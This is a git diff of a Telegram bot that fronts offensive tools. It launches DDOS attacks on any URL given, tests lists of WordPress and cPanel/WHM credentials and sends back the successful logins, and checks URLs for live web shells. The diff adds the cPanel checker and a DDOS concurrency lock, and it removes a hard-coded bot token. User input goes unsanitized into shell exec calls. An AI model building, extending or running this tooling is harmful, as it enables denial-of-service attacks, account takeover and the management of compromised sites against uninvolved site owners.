@@ -1,8 +1,10 @@
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 const fs = require('fs');
-const token = '6674838409:AAHLkaUy93k648M8FlvlhBddJLD0NgfzYd0';
+const token = 'YOUR_TELEGRAM_BOT_TOKEN';
 const bot = new TelegramBot(token, { polling: true });
+
+let isDDOSRunning = false; // Variabel untuk menandai apakah serangan DDOS sedang berlangsung
 
 function sendProgressUpdate(chatId, messageId, progress) {
     bot.editMessageText(`File received. Starting the check... ${progress}%`, {
@@ -23,11 +25,13 @@ bot.onText(/\/start/, (msg) => {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: 'Wordpress Checker', callback_data: 'wpcek' },
+                    { text: 'WordPress Checker', callback_data: 'wpcek' },
+                    { text: 'cPanel Login Checker', callback_data: 'cpcek' },
                     { text: 'Shell Checker', callback_data: 'shellcek' }
                 ],
                 [
                     { text: 'DDOS Attack', callback_data: 'ddos' },
+                    { text: 'HTTP Checker', callback_data: 'http' },
                     { text: 'Owner', url: 'https://t.me/cadelXploit' }
                 ]
             ]
@@ -43,11 +47,17 @@ bot.on('callback_query', (query) => {
         case 'wpcek':
             bot.sendMessage(chatId, `WordPress Checker\n\nCommand: /wpcek\n\nDescription: Use this command to check WordPress sites for login success and specific features like WP File Manager, Plugin Install, Theme Editor, Add Page, and Add Article.\n\nPlease send the file with the list of WordPress sites.`);
             break;
+        case 'cpcek':
+            bot.sendMessage(chatId, `cPanel Login Checker\n\nCommand: /cpcek\n\nDescription: Use this command to check cPanel and WHM login credentials. Please send the file with the list of accounts in the format URL|username|password.`);
+            break;
         case 'ddos':
             bot.sendMessage(chatId, `DDOS Attack\n\nCommand: /ddos <url>\n\nDescription: Use this command to perform a DDOS attack on the specified URL for a specified duration.\n\nExample: /ddos example.com 90`);
             break;
+        case 'http':
+            bot.sendMessage(chatId, `HTTP Checker\n\nCommand: /http <url>\n\nDescription: Use this command to check HTTP status of a URL.\n\nPlease enter the URL to check HTTP status.`);
+            break;
         case 'shellcek':
-            bot.sendMessage(chatId, `Shell Checker\n\nCommand: /shellcek\n\nDescription: Use this command to check websites' HTTP status codes. Please send the file with the list of websites.`);
+            bot.sendMessage(chatId, `Shell Checker\n\nCommand: /shellcek\n\nDescription: Use this command to check HTTP status of multiple URLs listed in a file. Please send the file with the list of websites.`);
             break;
         default:
             break;
@@ -128,28 +138,95 @@ bot.onText(/\/wpcek/, (msg) => {
     });
 });
 
+bot.onText(/\/cpcek/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, 'Please send the file with the list of cPanel accounts in the format URL|username|password.');
+
+    bot.once('document', (msg) => {
+        const fileId = msg.document.file_id;
+        const filePath = `./${msg.document.file_name}`;
+        const fileStream = bot.getFileStream(fileId);
+        const writeStream = fs.createWriteStream(filePath);
+
+        fileStream.pipe(writeStream).on('finish', () => {
+            bot.sendMessage(chatId, 'File received. Starting the check...', {
+                reply_markup: {
+                    inline_keyboard: [[{ text: 'Progress: 0%', callback_data: 'progress' }]]
+                }
+            }).then(sentMessage => {
+                const messageId = sentMessage.message_id;
+                let progress = 0;
+
+                const intervalId = setInterval(() => {
+                    sendProgressUpdate(chatId, messageId, progress);
+                    progress += 10; // Increment progress by 10%
+                }, 5000); // Check progress every 5 seconds
+
+                exec(`python3 cp.py ${filePath} 10`, (error, stdout, stderr) => {
+                    clearInterval(intervalId); // Stop checking progress
+                    if (error) {
+                        bot.sendMessage(chatId, `Error: ${error.message}`);
+                        console.error(`Error: ${error.message}`);
+                        return;
+                    }
+                    if (stderr) {
+                        bot.sendMessage(chatId, `Stderr: ${stderr}`);
+                        console.error(`Stderr: ${stderr}`);
+                        return;
+                    }
+
+                    console.log(`Stdout: ${stdout}`);
+                    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
+
+                    const goodFilePath = './good.txt';
+                    if (fs.existsSync(goodFilePath)) {
+                        bot.sendDocument(chatId, goodFilePath, { caption: 'Successful logins: URL|username|password' }).then(() => {
+                            fs.unlinkSync(goodFilePath);
+                        });
+                    } else {
+                        bot.sendMessage(chatId, 'No successful logins found.');
+                    }
+                });
+            });
+        });
+
+        writeStream.on('error', (error) => {
+            bot.sendMessage(chatId, `Failed to write file: ${error.message}`);
+            console.error(`Failed to write file: ${error.message}`);
+        });
+    });
+});
+
 bot.onText(/\/ddos (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const url = match[1];
     const duration = 90; // Default duration, you can change this as needed
 
+    if (isDDOSRunning) {
+        bot.sendMessage(chatId, 'Sorry, another DDOS attack is already in progress. Please wait until it finishes.');
+        return;
+    }
+
+    isDDOSRunning = true;
+
     bot.sendMessage(chatId, `Starting DDOS attack to ${url} for ${duration} seconds...`);
 
     exec(`python3 ddos.py ${url} ${duration}`, (error, stdout, stderr) => {
+        isDDOSRunning = false; // Reset the flag after attack is finished
         if (error) {
             bot.sendMessage(chatId, `Error: ${error.message}`);
             console.error(`Error: ${error.message}`);
             return;
-        }
-        if (stderr) {
-            bot.sendMessage(chatId, `Stderr: ${stderr}`);
-            console.error(`Stderr: ${stderr}`);
-            return;
-        }
+    }
+    if (stderr) {
+        bot.sendMessage(chatId, `Stderr: ${stderr}`);
+        console.error(`Stderr: ${stderr}`);
+        return;
+    }
 
-        console.log(`Stdout: ${stdout}`);
-        bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
-    });
+    console.log(`Stdout: ${stdout}`);
+    bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
+});
 });
 
 bot.onText(/\/shellcek/, (msg) => {
@@ -192,13 +269,13 @@ bot.onText(/\/shellcek/, (msg) => {
                     console.log(`Stdout: ${stdout}`);
                     bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
 
-                    const outputFile = 'goodshell.txt';
-                    if (fs.existsSync(outputFile)) {
-                        bot.sendDocument(chatId, outputFile, { caption: 'Results for Shell Checker' }).then(() => {
-                            fs.unlinkSync(outputFile); // Remove the output file after sending
+                    const goodFilePath = './goodshell.txt';
+                    if (fs.existsSync(goodFilePath)) {
+                        bot.sendDocument(chatId, goodFilePath, { caption: 'Successful shells: URL' }).then(() => {
+                            fs.unlinkSync(goodFilePath);
                         });
                     } else {
-                        bot.sendMessage(chatId, 'No successful HTTP status codes found.');
+                        bot.sendMessage(chatId, 'No successful shells found.');
                     }
                 });
             });
@@ -212,13 +289,3 @@ bot.onText(/\/shellcek/, (msg) => {
 });
 
 bot.on('polling_error', (error) => console.log(`Polling Error: ${error.message}`));
-
-function sendProgressUpdate(chatId, messageId, progress) {
-    bot.editMessageText(`File received. Starting the check... ${progress}%`, {
-        chat_id: chatId,
-        message_id: messageId,
-        reply_markup: {
-            inline_keyboard: [[{ text: `Progress: ${progress}%`, callback_data: 'progress' }]]
-        }
-    });
-}
